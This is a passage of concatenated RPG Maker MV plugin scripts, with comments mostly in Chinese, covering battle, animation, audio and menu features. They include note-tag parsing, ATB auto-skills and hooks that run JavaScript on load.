	set:function(rhs){
		const rtv=this._bgmVol=rhs;
		this.updateBgmVol();
		return rtv;
	},get:function(){
		return this._bgmVol;
	},
	configurable: true
});
Object[k](r, optionSymbol, {
	set:function(rhs){
		const rtv=this[optionSymbolKey]=rhs;
		this.updateBgmVol();
		return rtv;
	},get:function(){
		return this[optionSymbolKey];
	},
	configurable: true
});
Object[k](r, optionSymbolKeyRate, { // 變成幾倍
	get:function(){
		let rtv=SceneManager[optionSymbol]?this[optionSymbol]:0;
		if(isNaN(rtv)) rtv=defaultDecPercent;
		return (100-rtv)/100;
	},
	configurable: false
});

cf(cf(cf(SceneManager,'changeScene',function f(){
	const sc=this._scene;
	const rtv=f.ori.apply(this,arguments);
	if(this._scene && sc && this._scene!==sc) this.onSceneChange();
	return rtv;
}),'onSceneChange',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	this[f.tbl[0]]();
	return rtv;
},t),t[0],function f(){
	const sc=this._scene; if(!sc) return;
	if(f.tbl.inited){
		const func=f.tbl.funcs[ f.tbl.scs.has(sc.constructor)|(f.tbl.scs.has(this._previousClass)<<1) ];
		if(func) func.call(this,f.tbl.tbl); // Scene_Options will overwrite it @terminate
	}else if(sc.constructor===Scene_Title){
		// init
		f.tbl.inited=true;
		f.tbl.scs=f.tbl._initScs();
	}
},{
_initScs:()=>new Set([Scene_Title,Scene_Map,Scene_Battle,Scene_Gameover,]),
funcs:[
undefined,
function(tbl){ // restore
	this[tbl[2]]=false;
	ConfigManager[tbl[3]]();
},
function(tbl){ // decrease
	this[tbl[2]]=true;
	ConfigManager[tbl[3]]();
},
undefined,
],
inited:false,
scs:undefined, // scenes use 100% volume from setting
tbl:t,
})[t[2]]=false;

cf(Scene_Options.prototype,'terminate',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments),sm=SceneManager;
	const b=AudioManager._bgmBuffer;
	sm._lastBgmVol=b&&b.volume;
	sm._lastBgmVolDecPercent=ConfigManager[f.tbl[0]];
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 全域動畫選項(dataOnly)
 * @author agold404
 * @help $gameSystem.animationOptions_*()
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
[['rotate',0],['scalex',1],['scaley',1],],
undefined, // 1: default values // not used
];
t[1]=new Map(t[0]);
new cfc(Game_System.prototype).add('animationOptions_get',function f(){
	let rtv=this._aniOpt;
	if(!rtv){
		rtv=this._aniOpt={};
		for(let x=0,arr=f.tbl[0],xs=arr.length;x!==xs;++x) rtv[arr[x][0]]=arr[x][1];
	}
	return rtv;
},t,true,true).add('animationOptions_reset',function f(){
	const opt=this.animationOptions_get();
	for(let x=0,arr=f.tbl[0],xs=arr.length;x!==xs;++x) opt[arr[x][0]]=arr[x][1];
	return this;
},t,true,true).add('animationOptions_setRotate',function f(rotate){
	const opt=this.animationOptions_get();
	opt.rotate=rotate;
	return this;
},t,true,true).add('animationOptions_setScaleX',function f(scalex){
	const opt=this.animationOptions_get();
	opt.scalex=scalex;
	return this;
},t,true,true).add('animationOptions_setScaleY',function f(scaley){
	const opt=this.animationOptions_get();
	opt.scaley=scaley;
	return this;
},t,true,true).add('animationOptions_set',function f(newOpt){
	const opt=this.animationOptions_get();
	for(let x=0,arr=f.tbl[0],xs=arr.length;x!==xs;++x) if(arr[x][0] in newOpt) opt[arr[x][0]]=newOpt[arr[x][0]];
	return this;
},t,true,true).add('animationOptions_applyTo',function f(opt,carryingOn){
	const sysOpt=this.animationOptions_get(),tbl0=f.tbl[0];
	let rotate=0;
	let scalex=1;
	let scaley=1;
	if((tbl0[0][0] in sysOpt) && sysOpt.rotate!==0) rotate+=sysOpt.rotate;
	if((tbl0[1][0] in sysOpt) && sysOpt.scalex!==1) scalex*=sysOpt.scalex;
	if((tbl0[2][0] in sysOpt) && sysOpt.scaley!==1) scaley*=sysOpt.scaley;
	if(rotate!==0){
		if(carryingOn && (tbl0[0][0] in opt)) opt.rotate+=rotate;
		else opt.rotate=rotate;
	}
	if(scalex!==1){
		if(carryingOn && (tbl0[1][0] in opt)) opt.scalex*=scalex;
		else opt.scalex=scalex;
	}
	if(scaley!==1){
		if(carryingOn && (tbl0[2][0] in opt)) opt.scalex*=scaley;
		else opt.scaley=scaley;
	}
	return this;
},t,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 使全螢幕動畫位於圖片上層
 * @author agold404
 * @help SceneManager.screenAniOnTopOfPic_set, SceneManager.screenAniOnTopOfPic_clear, SceneManager.screenAniOnTopOfPic_get, 
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

k='screenAniOnTopOfPic';

cf(cf(cf(SceneManager,k+'_get',function f(){
	return this._screenAniOnTopOfPic;
}),k+'_set',function f(){
	this._screenAniOnTopOfPic=true;
}),k+'_clear',function f(){
	this._screenAniOnTopOfPic=false;
})._aniOnTopOfPic=false;

t=[
"_"+k,
k+"_get",
Game_System.prototype.animationOptions_get.tbl[0],
]

cf(Game_CharacterBase.prototype,'requestAnimation',function f(aniId,aniNamingKey,aniOpt){
	const rtv=f.ori.apply(this,arguments);
	let opt=this._aniOpt=aniOpt; if(!opt) opt=this._aniOpt={};
	opt[f.tbl[0]]=SceneManager[f.tbl[1]]();
	$gameSystem.animationOptions_applyTo(opt,true);
	this._aniNamingKey=aniNamingKey;
	return rtv;
},t);

cf(Game_Battler.prototype,'startAnimation',function f(){
	const rtv=f.ori.apply(this,arguments);
	const aniInfo=this._animations.back;
	let opt=aniInfo.opt; if(!opt) opt=aniInfo.opt={};
	opt[f.tbl[0]]=SceneManager[f.tbl[1]]();
	$gameSystem.animationOptions_applyTo(opt,true);
	return rtv;
},t);

cf(Sprite_Base.prototype,'startAnimation',function f(ani,mir,dly,r,opt){
	const rtv=f.ori.apply(this,arguments),sm=SceneManager;
	if(opt && opt[f.tbl[0]] && ani.position===3){ const sps=sm._scene._spriteset; if(sps){ const pc=sps._pictureContainer; if(pc){
		const pp=pc.parent;
		let op=pp._anisOnTopOfPics; if(!op){
			op=pp._anisOnTopOfPics=new Sprite();
			op.width  =pp.width  ;
			op.height =pp.height ;
			const pcp=pc.parent; pcp.addChildAt(op,pcp.getChildIndex(pc)+1);
		}
		op.addChild(this._animationSprites.back);
	} } }
	return rtv;
},t);

cf(Sprite_Character.prototype,'setupAnimation',function f(){
	const chr=this._character;
	if(chr.animationId()>0){
		const animation=$dataAnimations[chr.animationId()];
		const srcOpt=chr._aniOpt;
		const opt={};
		if(srcOpt){
			opt[f.tbl[0]]=srcOpt[f.tbl[0]];
			for(let x=0,arr=f.tbl[2],xs=arr.length;x!==xs;++x) if(arr[x][0] in srcOpt) opt[arr[x][0]]=srcOpt[arr[x][0]];
		}
		this.startAnimation(animation,false,0,undefined,opt);
		chr.startAnimation();
	}
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 受擊後執行javascript
 * @author agold404
 * @help 有trait的東西的note <onDamaged_javascript:["js function code that does not include '>'",number_priority_default_0]>
 * 
 * or not using an array and priority is 0
 * <onDamaged_javascript:"js function code that does not include '>'">
 * 
 * e.g.
 * <onDamaged_javascript:"(function(value){this.gainHp(123);})">
 * <onDamaged_javascript:["(function(value){this.gainHp(123);})",321]>
 * 
 * same priority should be treated as an unstable order.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kw='onDamaged_javascript';
const kw_main='get_'+kw;
const kw_action='is_'+kw;
const kw_action_bit="_"+kw_action;
const kw_pend='pend_'+kw;
const kw_push='push_'+kw;
const kw_getQ='getQ_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.addEnum(kw);
gbb.addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=meta[kw]&&dataobj.traits; if(!ts) return;
	const v=JSON.parse(meta[kw]);
	const o=v.constructor===Array?v[0]-0||0:0;
	const f=v.constructor===Array?v[0]:v;
	ts.push({code:gbb[kw],dataId:o,value:f,func:undefined,});
},
];
}

t=[kw_main,gbb[kw],(a,b)=>a.dataId-b.dataId,t=>t.func=t.func||eval(t.value),];
cf(cf(Game_Battler.prototype,kw_main,function f(){
	return this.traits(f.tbl[1]).sort(f.tbl[2]).map(f.tbl[3]);
},t),'onDamage',function f(val,subject){
	const rtv=f.ori.apply(this,arguments);
	for(let x=0,arr=this[f.tbl[0]]();x!==arr.length;++x) arr[x].call(this,val,subject);
	return rtv;
},t);
t=undefined;

})();


﻿"use strict";
/*:
 * @plugindesc 怪物呼吸若隱若現，使用 Math.cos 。
 * @author agold404
 * @help 怪物的note <呼吸_若隱若現:{"minAlpha":0到1的數字,"maxAlpha":0到1的數字,"週期":幀數}>
 * 
 * 從 minAlpha 開始。
 * minAlpha 沒填當 0 。
 * maxAlpha 沒填當 1 。
 * 週期沒填當 120 ；填 0 會整個無效。
 * 都沒打算填可以寫這樣就好:
 * <呼吸_若隱若現>
 * 
 * e.g.
 * <呼吸_若隱若現:{"minAlpha":0.125,"maxAlpha":1,"週期":120}>
 * 
 * same priority should be treated as an unstable order.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw='呼吸_若隱若現';
const kw_main='update_'+kw;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataEnemies .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=meta[kw]&&dataobj.traits; if(!ts) return;
	let info=JSON.parse(meta[kw]); if(info===true) info={};
	info.minAlpha-=0; if(isNaN(info.minAlpha)) info.minAlpha=0;
	info.maxAlpha-=0; if(isNaN(info.maxAlpha)) info.maxAlpha=1;
	info.週期-=0;     if(isNaN(info.週期))     info.週期=120;
	dataobj[kw]=info;
},
];
}

t=[kw_main,kw,];
cf(Sprite_Battler.prototype,kw_main,function f(){
	const btlr=this._battler;
	const info=btlr.getData()[f.tbl[1]]; if(!info || !info.週期 || btlr.isDead()) return;
	const m=(info.maxAlpha+info.minAlpha)/2.0,r=(info.maxAlpha-info.minAlpha)/2.0;
	this[f.tbl[1]]|=0;
	this.alpha=m-Math.cos(this[f.tbl[1]]/info.週期*2*Math.PI)*r;
	++this[f.tbl[1]]; this[f.tbl[1]]%=info.週期;
},t);
cf(Sprite_Enemy.prototype,'update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[0]]();
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 禁用有呼叫公共事件的道具API
 * @author agold404
 * @help 詳細說明
 * 第二行
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

k='commonEventItems';
t=[
"canUse_"+k,
"isItem_"+k,
"_"+k+"Disabled",
eff=>Game_Action.EFFECT_COMMON_EVENT===eff.code,
];
cf(cf(cf(cf(Game_System.prototype,t[0],function f(){
	return !this[f.tbl[2]];
},t),t[1],function f(item){
	if(!item || !item.effects) return false;
	return item.effects.some(f.tbl[3]);
},t),"enable_"+k,function f(){
	this[f.tbl[2]]=false;
},t),"disable_"+k,function f(){
	this[f.tbl[2]]=true;
},t);

cf(Game_Party.prototype,'canUse',function f(item){
	if(item && !$gameSystem[f.tbl[0]]() && $gameSystem[f.tbl[1]](item)) return false;
	return f.ori.apply(this,arguments);
},t);

})();


"use strict";
/*:
 * @plugindesc Scene_Battle per-frame events
 * @author agold404
 * @help this plugin makes a troop event page become per-frame updating,
 * which means: Even during a player input (action selection), the corresponding event page will be running.
 * 
 * use:
 * in troop event page, comment first line: (at-sign)PERFRAME
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Battle.prototype;
t=['updatePerframeEvents','isPerframeEventList',];

k=t[1];
r=p[k]; (p[k]=function f(cmds){
	// shouldn't return 'undefined'
	let rtv=false;
	for(let c=0;c!==cmds.length;++c){
		if(cmds[c].code===108 && cmds[c].parameters[0]==="@PERFRAME"){
			rtv=true;
			break;
		}
	}
	return rtv;
}).ori=r;
k=t[0];
r=p[k]; (p[k]=function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	if(!this._perframe){
		this._perframe=[];
		this._perframeIds=[];
		for(let p=0,pgs=$gameTroop.troop().pages;p!==pgs.length;++p){
			let perframe=false;
			if(pgs[p].perframe===undefined) pgs[p].perframe=this[f.tbl[1]](pgs[p].list);
			if(pgs[p].perframe) this._perframeIds.push(p);
		}
		for(let x=0,arr=this._perframeIds;x!==arr.length;++x) this._perframe.push(new Game_Interpreter);
	}
	for(let x=0,arr=this._perframe;x!==arr.length;++x){
		if(arr[x].isRunning()) arr[x].update();
		else if(BattleManager._perframeEnabled) arr[x].setup($gameTroop.troop().pages[arr[x]._pageId=this._perframeIds[x]].list);
	}
	return rtv;
}).ori=r;
p[k].tbl=t;

k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[0]]();
	return rtv;
}).ori=r;
p[k].tbl=t;

t=undefined;
}

{ const p=BattleManager;
k='startBattle';
r=p[k]; (p[k]=function f(){
	this._result=undefined;
	const rtv=f.ori.apply(this,arguments);
	this._perframeEnabled=true;
	return rtv;
}).ori=r;
k='endBattle';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._perframeEnabled=false;
	this._result=arguments[0];
	if(this._perframe){ let someRunning=false; do{ for(let x=0,arr=this._perframe;x!==arr.length;++x){
		if(arr[x].isRunning()){ arr[x].update(); someRunning=true; }
	} }while(someRunning); }
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc traits: let one must substitute the incoming action to friendUnit members (except certain hit) .
 * @author agold404
 * @help note: <手塚區>
 * the one must be alive.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kw='手塚區';
const kw_main='apply_'+kw;
const kw_get='get_'+kw;
const kw_can='can_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.addEnum(kw);
gbb.addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=meta[kw]&&dataobj.traits; if(!ts) return;
	if(meta[kw]) ts.push({code:gbb[kw],dataId:1,value:meta[kw],});
},
];
}

t=[kw_can,kw_get,gbb[kw],];
cf(cf(Game_BattlerBase.prototype,kw_can,function f(){
	return this.isAlive() && this[f.tbl[1]]();
},t),kw_get,function f(){
	return !!this.traits(f.tbl[2]).length;
},t);

k=kw_main;
cf(cf(BattleManager,k,function f(trgt){
	let rtv=trgt;
	if(!this._action.isCertainHit()){ for(let x=0,arr=rtv.friendsUnit().members();x!==arr.length;++x) if(arr[x][f.tbl[0]]()){ rtv=arr[x]; break; } }
	return rtv;
},t),'applySubstitute',function f(){
	return this[f.tbl[0]](f.ori.apply(this,arguments));
},[k,]);
t=undefined;

})();


﻿"use strict";
/*:
 * @plugindesc 技能、道具作用次數倍率
 * @author agold404
 * @help note: <addRepeatSkill:數字> <addRepeatItem:數字> <addRepeatSkillCrtn:[[技能id,數字],...]> <addRepeatItemCrtn:[[道具id,數字],...]> 
 * 數字未 >=0 者，會被忽略
 * 原次數乘上總倍率後無條件捨去到個位數，最低不會低於0。
 * 有修改普攻的情況，技能id請填 "普攻" 。
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kwB='addRepeat';
const kwTbl={
skill:[kwB+'Skill'],
item:[kwB+'Item'],
},kts=[];
for(let i in kwTbl){
	kwTbl[i].push(kwTbl[i][0]+'Crtn');
	kts.push(i);
}

t=new Map();
if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
for(let i in kwTbl){ kwTbl[i].forEach(s=>{
	const tr="TRAIT_"+s;
	t.set(s,tr);
	gbb.addEnum(tr);
}); }
kwTbl._s2t=t;
t=undefined;

kwTbl._kts=kts;
kwTbl._normalAtkId="普攻";

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts) return;
	for(let i=0;i!==kts.length;++i){
		const ks=kwTbl[kts[i]];
		if(meta[ks[0]]){
			const v=meta[ks[0]]-0;
			if(v>=0) ts.push({code:gbb[kwTbl._s2t.get(ks[0])],dataId:0,value:v,});
		}
		if(meta[ks[1]]){
			const arr=JSON.parse(meta[ks[1]]),c=gbb[kwTbl._s2t.get(ks[1])];
			for(let x=0;x!==arr.length;++x){
				const v=arr[x][1]-0;
				if(v>=0) ts.push({code:c,dataId:arr[x][0],value:v,});
			}
		}
	}
},
];
}

t=['num_addRepeats',];
cf(Game_BattlerBase.prototype,t[0],function f(obj){
	let rtv=f.ori?f.ori.apply(this,arguments):0;
	if(!f.tbl.tbl){ f.tbl.tbl=[
		['skill' ,DataManager.isSkill ],
		['item'  ,DataManager.isItem  ],
	]; }
	for(let x=0,arr=f.tbl.tbl;x!==arr.length;++x){
		const func=arr[x][1];
		if(!func.call(DataManager,obj)) continue;
		const kws=f.tbl[arr[x][0]];
		if(func===DataManager.isSkill && obj===$dataSkills[this.attackSkillId()]) rtv+=this.traitsSum(Game_BattlerBase[f.tbl._s2t.get(kws[1])],f.tbl._normalAtkId);
		rtv+=this.traitsSumAll(Game_BattlerBase[f.tbl._s2t.get(kws[0])]);
		rtv+=this.traitsSum(Game_BattlerBase[f.tbl._s2t.get(kws[1])],obj.id);
	}
	return rtv;
},kwTbl);
cf(Game_Action.prototype,'numRepeats',function f(){
	let rtv=f.ori.apply(this,arguments);
	rtv+=this.subject()[f.tbl[0]](this.item());
	return (rtv>=0?rtv:0)|0;
},t);
t=undefined;

})();


﻿"use strict";
/*:
 * @plugindesc 自動技能，全域的戰鬥atb跑條自動施放
 * @author agold404
 * @help on skill's note <autoSkill:[turnAtbCharge,times,"js_condition"]>
 * 
 * times is a positive integer
 * "js condition" is a string.
 * 
 * or
 * 
 * <autoSkill:[turnAtbCharge]>
 * without "times", implying Infinity
 * without "js condition", implying true
 * 
 * 這個被天使染指過，說什麼用事件
 * = =
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw='autoSkill';

const evtcmd_save={code:355,indent:0,parameters:["$gameTemp._autoSkill_atb=$gameTemp._autoSkill_btlr._atbSpeed;  console.log('save'); debugger;"],};
const evtcmd_wait={code:230,indent:0,parameters:[1],};
const evtcmd_load={code:355,indent:0,parameters:["$gameTemp._autoSkill_btlr._atbSpeed=$gameTemp._autoSkill_atb;  $gameTemp._autoSkill_btlr=undefined;  console.log('load'); debugger;"],};

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataSkills.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(dataobj[kw]=meta && meta[kw]?JSON.parse(meta[kw]):undefined){
		if(dataobj[kw].length===1) dataobj[kw].push(Infinity); // cache access property [1]
		if(dataobj[kw].length===2) dataobj[kw].push(undefined); // cache access property [2]
		dataobj[kw][1]-=0;
		dataobj[kw]._list=[
			//evtcmd_save,
			{code:339,indent:0,parameters:[0,0,dataobj.id,-1],},
			//evtcmd_wait,
			//evtcmd_load,
			Game_Interpreter.NOP,
		];
		// [(enemy=0,actor=1),actorId_or_enemyIdx,skillId,(last=-2,rnd=-1,(n-1)th; will be changed to user if ._isForUser ),] 
		if(dataobj[kw]._isForUser=dataobj.scope===11){
			dataobj.scope=7; // target type has no label in Game_Action
		}
	}
};
}

const timesIdx=1,funcIdx=2;
t=['_atbTicksAll',kw+"_getBtlr","_"+kw,"_"+kw+"_partyIdx","_"+kw+"_btlrIdx",kw,timesIdx,funcIdx,];
cf(
cf(
cf(
cf(
BattleManager,'updateATBTicks',function f(){
	this[f.tbl[0]]+=this.tickRate();
	return f.ori.apply(this,arguments);
},t),'startBattle',function f(){
	this[f.tbl[0]]=0;
	if(this[f.tbl[2]]) this[f.tbl[2]].clear(); else this[f.tbl[2]]=new Map(); // btlr -> skillLastChargedFull
	this[f.tbl[4]]=this[f.tbl[3]]=0;
	return f.ori.apply(this,arguments);
},t),t[1],function f(firstRetryPara){
	const curr=[this[f.tbl[3]],this[f.tbl[4]],];
	if(firstRetryPara && firstRetryPara[0]===curr[0] && firstRetryPara[1]===curr[1]) return;
	const pt=this[f.tbl[3]]?$gameParty:$gameTroop,idx=this[f.tbl[4]]|0;
	const arr=pt.allMembers();
	if(!idx || idx<arr.length){
		++this[f.tbl[4]];
		return (!arr[idx] || arr[idx].isHidden())?f.call(this,firstRetryPara||curr):arr[idx];
	}else{
		this[f.tbl[3]]^=1;
		this[f.tbl[4]]=0;
		return f.call(this,firstRetryPara||curr);
	}
},t),'pushActionSkill',function f(itrp,btlr,dataobj){
	const bm=this,skill=dataobj;
	if(bm.isAborting() || bm.isBattleEnd()) return;
	const info=skill[f.tbl[5]]; if(!info) return;
	
	const para=info._list[0].parameters;
	// set user
	para[0]=bm[f.tbl[3]];
	if(btlr.constructor===Game_Actor){
		if(!f.tbl.cloneId) f.tbl.cloneId={actr:$dataActors.length,}; // enemy is by party index, giveup
		para[1]=f.tbl.cloneId.actr;
		const src=btlr.getData();
		if(!src._autoSkillCloned){
			const trgt=src._autoSkill_clonedData={};
			for(let i in src) trgt[i]=src[i];
			trgt.id=para[1];
			trgt._cloneRef=src;
		}
		$dataActors[para[1]]=src._autoSkill_clonedData;
		($gameActors._data[para[1]]=JsonEx.makeDeepCopy(btlr))._actorId=para[1];
	}else{
		para[1]=bm[f.tbl[4]]-1;
	}
	// set target if scope=="user"(11)
	if(info._isForUser){
		if((para[3]=btlr.index())<0) return;
	}else para[3]=-1; // rnd=-1
	itrp.setup(info._list);
	return true;
},t);
new cfc(BattleManager).add('get_autoSkill_usedTimes',function f(btlr,dataobj){
	const cont=this._autoSkill_usedTimes_getContainer();
	const m=cont.get(btlr);
	return m?m.get(dataobj)|0:0;
},t).add('inc_autoSkill_usedTimes',function f(btlr,dataobj){
	const cont=this._autoSkill_usedTimes_getContainer();
	let m=cont.get(btlr); if(!m) cont.set(btlr,m=new Map());
	const rtv=(m.get(dataobj)|0)+1;
	m.set(dataobj,rtv);
	return rtv;
},t).add('_autoSkill_usedTimes_getContainer',function (){
	const sc=SceneManager._scene||{};
	let rtv=sc._autoSkill_usedTimes; if(!rtv) rtv=sc._autoSkill_usedTimes=new Map();
	return rtv;
},t);
cf(
cf(
Game_Troop.prototype,'setupBattleEvent',function f(){
	const rtv=f.ori.apply(this,arguments);
	this[f.tbl[1]]();
	return rtv;
},t),t[1],function f(){
	// supposed: 1 at a time.
	// it's important. the whole design is based on above.
	const itrp=this._interpreter;
	if(itrp.isRunning()) return true;
	const bm=BattleManager,pta=$gameParty.allMembers(),pte=$gameTroop.allMembers();
	for(let _=pta.length+pte.length;_--;){
		const btlr=bm[f.tbl[1]](); if(!btlr) continue;
		const skills=btlr.skills();
		let obj=bm[f.tbl[2]].get(btlr); if(!obj) bm[f.tbl[2]].set(btlr,obj=new Map());
		for(let x=0,arr=skills;x!==arr.length;++x){
			const skill=arr[x];
			const info=skill[f.tbl[5]]; if(!info) continue;
			const lastChargingStart=obj.get(skill)|0;
			{ const _=undefined; // block accessing outside-scope vars
			if( bm[f.tbl[0]]>=lastChargingStart+info[0] && (bm.get_autoSkill_usedTimes(btlr,skill)<info[f.tbl[6]]) && (info[f.tbl[7]]===_||eval(info[f.tbl[7]])) ) ;
			else continue;
			}
			obj.set(skill,bm[f.tbl[0]]);
			bm.inc_autoSkill_usedTimes(btlr,skill);
			
			if(bm.pushActionSkill(itrp,btlr,skill)) return;
		}
	}
},t);
t=undefined;

})();


﻿"use strict";
/*:
 * @plugindesc 讀取後先執行一些javascript。
 * @author agold404
 * @help $gameSystem._onLoadGameJs=[]; // onLoadgameJs
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

cf(DataManager,'extractSaveContents',function f(conts){
	const rtv=f.ori.apply(this,arguments);
	const arr=$gameSystem._onLoadGameJs;
	if(arr && arr.length){ for(let x=0;x!==arr.length;++x){
		try{
			eval(arr[x]);
		}catch(e){
			console.warn('onLoadGameJs fail:',arr[x]);
		}
	} }
	return rtv;
});

cf(cf(Game_System.prototype,'onLoadGameJs',function(){
	let rtv=this._onLoadGameJs; if(!rtv) rtv=this._onLoadGameJs=[];
	return rtv;
}),'onLoadGameJs_swap',function(idx1,idx2){
	const arr=this.onLoadGameJs();
	const tmp=arr[idx1]; arr[idx1]=arr[idx2]; arr[idx2]=tmp;
});

})();


﻿"use strict";
/*:
 * @plugindesc MainMenu. ver. 機器人G
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(1)(()=>{ let k,r,t;

t={
adjCmdPos:function(bm){
	const sp=this;
	const sc=sp._sc; if(sc._cmdPos_terminated!==false) return;
	const cmds=sc._commands,conf=sc._conf_cmdPos,idx=sp._cmdPos_idx,mid=sp._cmdPos_mid;
	let shx=conf.cmdw;
	if(sp._cmdPos_side){
		// R
		if(idx+1===cmds.length) sc._compos[idx][0]=cmds[idx].x=Graphics.boxWidth-conf.padx-Math.ceil((1-sp.anchor.x)*bm.width);
		for(let i=idx,x=cmds[idx].x;i--!==mid;) sc._compos[i][0]=cmds[i].x=(x-=conf.cmdw);
	}else{
		// L
		if(!idx) sc._compos[idx][0]=cmds[idx].x=conf.padx+Math.ceil(sp.anchor.x*bm.width);
		for(let i=idx+1,x=cmds[idx].x;i!==mid;++i) sc._compos[i][0]=cmds[i].x=(x+=conf.cmdw);
	}
	sc._compos[idx][1]=sp.y=conf.pady+bm.height*sp.anchor.y;
},
hideMogGold:(sp,i)=>{
	sp.visible=false;
	sp.alpha=sp.opacity=0;
	sp.x=-Graphics.boxWidth;
},
re:{
r:/\r/g,
cmdw:/(^|\n)[ \t]*cmdw[ \t]*=([^\n]+)/,
padx:/(^|\n)[ \t]*padx[ \t]*=([^\n]+)/,
pady:/(^|\n)[ \t]*pady[ \t]*=([^\n]+)/,
namex:/(^|\n)[ \t]*namex[ \t]*=([^\n]+)/,
namey:/(^|\n)[ \t]*namey[ \t]*=([^\n]+)/,
namew:/(^|\n)[ \t]*namew[ \t]*=([^\n]+)/,
nameh:/(^|\n)[ \t]*nameh[ \t]*=([^\n]+)/,
namedx:/(^|\n)[ \t]*namedx[ \t]*=([^\n]+)/,
namedy:/(^|\n)[ \t]*namedy[ \t]*=([^\n]+)/,
goldx:/(^|\n)[ \t]*goldx[ \t]*=([^\n]+)/,
goldy:/(^|\n)[ \t]*goldy[ \t]*=([^\n]+)/,
goldw:/(^|\n)[ \t]*goldw[ \t]*=([^\n]+)/,
goldh:/(^|\n)[ \t]*goldh[ \t]*=([^\n]+)/,
golda:/(^|\n)[ \t]*golda[ \t]*=([^\n]+)/,
// goldfsz:/(^|\n)[ \t]*goldfsz[ \t]*=([^\n]+)/,
},
defaults:{
cmdw:48,
padx:23,
pady:12,
namex:408,
namey:64,
namew:256,
nameh:32,
namedx:0,
namedy:-200,
goldx:135,
goldy:533,
goldw:148,
goldh:32,
golda:"right", // align
},
path:"BLR_custom/MainMenu/cmdPos.txt",
hasMog:undefined,
hasYep:undefined,
lineVal:(a,b,x,y)=>{
	// y=ax+b => ax+b-y?
	// point x,y
	return a*x+b-y;
},
sideSlopes:[2,-2],
btmWidth:46,
};
new cfc(Scene_Menu.prototype).add('createCommands',function f(){
	const rtv=f.ori.apply(this,arguments);
	const mid=(this._comList.length|0)-(this._comList.length>>1);
	this._conf_cmdPos=this.getConfig_cmdPos();
	for(let i=0|0;i!==this._comList.length;++i){
		const sp=this._commands[i];
		sp._sc=this;
		sp._cmdPos_side=(sp._cmdPos_idx=i)>=(sp._cmdPos_mid=mid);
		this._compos[i][1]=Moghunter.scMenu_ComY; // ?
		const bm=sp.bitmap; if(bm) bm.addLoadListener(f.tbl.adjCmdPos.bind(sp));
	}
